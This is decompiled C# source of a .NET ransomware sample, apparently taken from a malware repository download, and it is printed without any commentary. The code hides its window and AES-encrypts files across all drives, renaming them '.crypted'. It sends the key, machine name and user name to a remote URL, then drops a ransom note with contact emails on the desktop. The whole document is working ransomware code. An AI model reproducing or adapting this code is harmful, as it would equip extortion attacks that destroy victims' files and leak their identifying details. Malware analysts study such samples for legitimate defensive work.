// Decompiled with JetBrains decompiler
// Type: EncoderCSL.Form1
// Assembly: EncoderCSL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BC70EB6-E222-4E38-9ED5-32744A85C676
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Tear.gen-1cd3fa0de4807e268dc8a396dc670ba38d6729e7df613b33b046970a22ff6a2a.exe

using PreEmptive.SoS.Client.Messages;
using PreEmptive.SoS.Runtime;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace EncoderCSL
{
  public class Form1 : Form
  {
    private string targetURL = "http://encoder/index.php";
    private string userName = Environment.UserName;
    private string computerName = Environment.MachineName.ToString();
    private string userDir = "C:\\Users\\";
    private IContainer components;
    private Label label1;
    private Panel panel1;
    private Label label7;
    private Label label6;
    private Label label5;
    private Label label4;
    private Label label3;
    private Label label2;

    public Form1()
    {
      this.InitializeComponent();
      this.StartPosition = FormStartPosition.CenterScreen;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.label6.Text = this.userName;
      this.label7.Text = this.computerName;
      this.Visible = false;
      this.Opacity = 100.0;
      this.Makeit();
      this.Visible = true;
      this.Opacity = 50.0;
    }

    private void Form_Shown(object sender, EventArgs e)
    {
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 100,
        (byte) 23,
        (byte) 78,
        (byte) 19,
        (byte) 92,
        (byte) 34,
        (byte) 34,
        (byte) 65
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 2048);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public string Passwd(int length)
    {
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        Random random = new Random();
        while (0 < length--)
          stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
        return stringBuilder.ToString();
      }
      finally
      {
        SessionLifeCycleMessage A_0 = new SessionLifeCycleMessage();
        A_0.Event = new EventInformation()
        {
          Code = "Session.Stop"
        };
        A_0.Binary = h.a();
        Access.Send((PreEmptive.SoS.Client.Messages.Message) A_0, true);
        Access.Teardown();
      }
    }

    public void SendPassword(string password)
    {
      string targetUrl = this.targetURL;
      StreamReader streamReader = new StreamReader(WebRequest.Create(this.targetURL + "?" + ("mid=" + this.computerName + "&user=" + this.userName + "&password=" + password + "&add_form=send")).GetResponse().GetResponseStream());
      streamReader.ReadToEnd();
      streamReader.Close();
    }

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      System.IO.File.WriteAllBytes(file, bytes2);
      System.IO.File.Move(file, file + ".crypted");
    }

    private void encryptDirectory(string location, string password)
    {
      string[] source = new string[2]{ ".txtr", ".test" };
      string[] strArray1 = (string[]) null;
      try
      {
        strArray1 = Directory.GetFiles(location);
      }
      catch (UnauthorizedAccessException ex)
      {
      }
      catch (Exception ex)
      {
      }
      catch
      {
      }
      if (strArray1 != null)
      {
        names names = new names();
        names.a = true;
        for (int index = 0; index < strArray1.Length; ++index)
        {
          string extension = Path.GetExtension(strArray1[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
          {
            try
            {
              names.b = false;
              this.EncryptFile(strArray1[index], password);
            }
            catch (Exception ex)
            {
              names.c = true;
              names.a = false;
            }
          }
        }
      }
      string[] strArray2 = (string[]) null;
      try
      {
        strArray2 = Directory.GetDirectories(location);
      }
      catch (UnauthorizedAccessException ex)
      {
      }
      catch (Exception ex)
      {
      }
      catch
      {
      }
      if (strArray2 == null)
        return;
      for (int index = 0; index < strArray2.Length; ++index)
      {
        try
        {
          this.encryptDirectory(strArray2[index], password);
        }
        catch (Exception ex)
        {
        }
      }
    }

    private void Makeit()
    {
      try
      {
        string password = this.Passwd(16);
        foreach (string logicalDrive in Environment.GetLogicalDrives())
          this.encryptDirectory(logicalDrive + "\\", password);
        try
        {
          this.SendPassword(password);
          this.TextForUser();
        }
        catch (Exception ex)
        {
        }
      }
      finally
      {
        SessionLifeCycleMessage A_0 = new SessionLifeCycleMessage();
        A_0.Event = new EventInformation()
        {
          Code = "Session.Stop"
        };
        A_0.Binary = h.a();
        Access.Send((PreEmptive.SoS.Client.Messages.Message) A_0, true);
        Access.Teardown();
      }
    }

    public void TextForUser() => System.IO.File.WriteAllLines(this.userDir + this.userName + "\\Desktop\\READ.txt", new string[1]
    {
      "Hello! Your NameOfFile has been encrypted. \n For decrypt NameOfFile, plese contact with: \n  suporthermes@cock.li or knyaz@cock.li \n Data for decryption: " + this.computerName + " " + this.userName
    });

    private void label3_Click(object sender, EventArgs e)
    {
    }

    private void panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.label1 = new Label();
      this.panel1 = new Panel();
      this.label7 = new Label();
      this.label6 = new Label();
      this.label5 = new Label();
      this.label4 = new Label();
      this.label3 = new Label();
      this.label2 = new Label();
      this.panel1.SuspendLayout();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft YaHei", 21.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 204);
      this.label1.ForeColor = Color.Yellow;
      this.label1.Location = new Point(149, 32);
      this.label1.Name = "label1";
      this.label1.Size = new Size(547, 39);
      this.label1.TabIndex = 0;
      this.label1.Text = "Your files has been safely encrypted";
      this.panel1.BackColor = Color.White;
      this.panel1.Controls.Add((Control) this.label7);
      this.panel1.Controls.Add((Control) this.label6);
      this.panel1.Controls.Add((Control) this.label5);
      this.panel1.Controls.Add((Control) this.label4);
      this.panel1.Controls.Add((Control) this.label3);
      this.panel1.Controls.Add((Control) this.label2);
      this.panel1.Location = new Point(-4, 99);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(817, 305);
      this.panel1.TabIndex = 1;
      this.panel1.Paint += new PaintEventHandler(this.panel1_Paint);
      this.label7.AutoSize = true;
      this.label7.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label7.ForeColor = Color.DarkGreen;
      this.label7.Location = new Point(455, 200);
      this.label7.Name = "label7";
      this.label7.Size = new Size(60, 24);
      this.label7.TabIndex = 5;
      this.label7.Text = "label7";
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label6.ForeColor = Color.DarkGreen;
      this.label6.Location = new Point(455, 176);
      this.label6.Name = "label6";
      this.label6.Size = new Size(60, 24);
      this.label6.TabIndex = 4;
      this.label6.Text = "label6";
      this.label5.AutoSize = true;
      this.label5.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label5.Location = new Point(310, 200);
      this.label5.Name = "label5";
      this.label5.Size = new Size(110, 24);
      this.label5.TabIndex = 3;
      this.label5.Text = "Machine ID:";
      this.label4.AutoSize = true;
      this.label4.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label4.Location = new Point(310, 176);
      this.label4.Name = "label4";
      this.label4.Size = new Size(76, 24);
      this.label4.TabIndex = 2;
      this.label4.Text = "User ID:";
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft YaHei UI", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 204);
      this.label3.ForeColor = Color.Red;
      this.label3.Location = new Point(69, 72);
      this.label3.Name = "label3";
      this.label3.Size = new Size(690, 78);
      this.label3.TabIndex = 1;
      this.label3.Text = "Don't try to decrypt files yourself! It can be damage your files forever!\r\n\r\n\r\n";
      this.label3.Click += new EventHandler(this.label3_Click);
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft YaHei UI", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 204);
      this.label2.ForeColor = Color.Red;
      this.label2.Location = new Point(132, 24);
      this.label2.Name = "label2";
      this.label2.Size = new Size(568, 26);
      this.label2.TabIndex = 0;
      this.label2.Text = "Please open READ_ME file on your desktop for decryption\r\n";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(810, 400);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.label1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = "Encoder CSL";
      this.Load += new EventHandler(this.Form1_Load);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
